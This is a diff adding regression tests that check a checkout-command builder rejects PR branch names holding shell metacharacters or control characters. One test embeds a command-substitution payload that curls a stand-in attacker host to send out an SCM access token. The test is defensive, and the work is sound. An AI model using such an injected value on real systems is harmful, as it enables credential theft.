@@ -1398,6 +1398,65 @@ describe('index', function () {
                 assert.deepEqual(command, testRootDirCommands);
             });
         });
+
+        it('rejects PR branch names containing shell metacharacters', () => {
+            config.prRef = `'"\`;!&$<>|`;
+
+            return scm.getCheckoutCommand(config).then(
+                () => assert.fail('expected getCheckoutCommand to reject'),
+                err => {
+                    assert.match(err.message, /Invalid PR branch name/);
+                    assert.equal(err.statusCode, 400);
+                }
+            );
+        });
+
+        [`'`, '"', '`', ';', '!', '$', '&', '<', '>', '|'].forEach(char => {
+            it(`rejects PR branch names containing shell metacharacter: ${char}`, () => {
+                config.prRef = `branch${char}name`;
+
+                return scm.getCheckoutCommand(config).then(
+                    () => assert.fail('expected getCheckoutCommand to reject'),
+                    err => {
+                        assert.match(err.message, /Invalid PR branch name/);
+                        assert.equal(err.statusCode, 400);
+                    }
+                );
+            });
+        });
+
+        it('rejects the command-substitution payload from the vulnerability report', () => {
+            config.prRef = 'test$(curl attacker.example/exfil?token=$SCM_ACCESS_TOKEN)';
+
+            return scm.getCheckoutCommand(config).then(
+                () => assert.fail('expected getCheckoutCommand to reject'),
+                err => {
+                    assert.match(err.message, /Invalid PR branch name/);
+                    assert.equal(err.statusCode, 400);
+                }
+            );
+        });
+
+        it('rejects PR branch names containing control characters', () => {
+            config.prRef = 'branch\nname';
+
+            return scm.getCheckoutCommand(config).then(
+                () => assert.fail('expected getCheckoutCommand to reject'),
+                err => {
+                    assert.match(err.message, /Invalid PR branch name/);
+                    assert.equal(err.statusCode, 400);
+                }
+            );
+        });
+
+        it('accepts PR branch names with conservatively-safe special characters', () => {
+            config.prRef = 'feature/some_module.v1-rc1';
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.isString(command.command);
+                assert.isAbove(command.command.length, 0);
+            });
+        });
     });
 
     describe('stats', () => {
